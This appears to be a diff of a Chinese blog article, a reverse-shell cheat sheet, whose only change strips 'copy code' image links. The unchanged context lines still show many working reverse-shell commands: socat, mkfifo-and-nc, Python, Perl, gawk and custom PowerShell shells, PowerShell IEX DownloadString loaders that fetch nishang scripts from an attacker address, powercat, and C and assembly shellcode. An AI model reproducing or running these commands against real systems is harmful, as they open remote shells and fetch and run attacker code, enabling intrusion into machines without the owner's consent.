@@ -255,7 +255,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.211.55.2:9999
 
 ### 4. Xterm 
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # 在主控端配置
@@ -275,7 +275,7 @@ xterm -display attackerip:1
 $ DISPLAY=attackerip:0 xterm
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ## 0x3：“管道符”+ “socket网络通信”实现bash反弹shell
 
@@ -283,7 +283,7 @@ $ DISPLAY=attackerip:0 xterm
 
 匿名管道（pipe）是内核中的一个单向数据通道，管道有一个读端和一个写端。一般用于父子进程之间的通信。
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # client
@@ -294,7 +294,7 @@ ncat -lvvp 7777
 ncat -lvvp 8888
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ![img](https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104646111-1137243959.png)
 
@@ -316,7 +316,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 110.211.55.2 7777 >/tmp/f
 
 ### 1. python反弹shell
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
@@ -331,7 +331,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(['/bin/bash','-i'])
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 - 使用duo2方法将第二个形参（文件描述符）指向第一个形参（socket链接）
   - os.dup2(s.fileno(),0)
@@ -341,7 +341,7 @@ p=subprocess.call(['/bin/bash','-i'])
 
 ### 2. perl反弹shell 
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 perl -e 'use Socket;$i=”10.211.55.2";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -359,7 +359,7 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
 }
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ### 3. ruby反弹shell
 
@@ -395,7 +395,7 @@ p.waitFor()
 
 ### 8. gawk
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 #!/usr/bin/gawk -f
@@ -420,7 +420,7 @@ BEGIN {
 }
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ### 9. powershell反弹shell
 
@@ -428,7 +428,7 @@ powershell反弹shell本质上是一些多功能代码集合，通过调用windo
 
 #### 1）powercat反弹shell
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # 攻击者(192.168.159.134)开启监听：
@@ -442,7 +442,7 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString
 powercat -c 192.168.159.134 -p 6666 -e cmd
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 #### 2）nishang反弹shell
 
@@ -450,7 +450,7 @@ Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻�
 
 **## Reverse TCP shell**
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # 攻击者(192.168.159.134)开启监听：
@@ -465,11 +465,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.159.134 -port 6666
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 **## Reverse UDP shell**
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # 攻击者(192.168.159.134)开启监听：
@@ -480,11 +480,11 @@ powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134
 Invoke-PowerShellUdp -Reverse -IPAddress 192.168.159.134 -port 53
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 **## Reverse ICMP shell**
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # 首先攻击端下载icmpsh_m.py文件
@@ -498,13 +498,13 @@ python icmpsh_m.py 192.168.159.134 192.168.159.138 #开启监听
 powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 #### 3）自定义powershell函数反弹shell
 
 利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 # 攻击者(192.168.159.134) 开启监听 
@@ -518,7 +518,7 @@ $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]:
 $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 #### 4）Empire 结合office反弹shell
 
@@ -551,7 +551,7 @@ https://www.anquanke.com/post/id/99793
 
 #### 1）C代码
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 #include<sys/socket.h>   //构造socket所需的库
@@ -577,11 +577,11 @@ int main()
 }
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 #### 2）汇编语言代码
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 ```
 section .text
@@ -645,7 +645,7 @@ mov al,0x0b
 int 0x80
 ```
 
-[![复制代码](https://assets.cnblogs.com/images/copycode.gif)](javascript:void(0);)
+
 
 注意，push long 0x6400A8C0 这里就是IP地址，出现了00，在网络传输中会被截断。
 
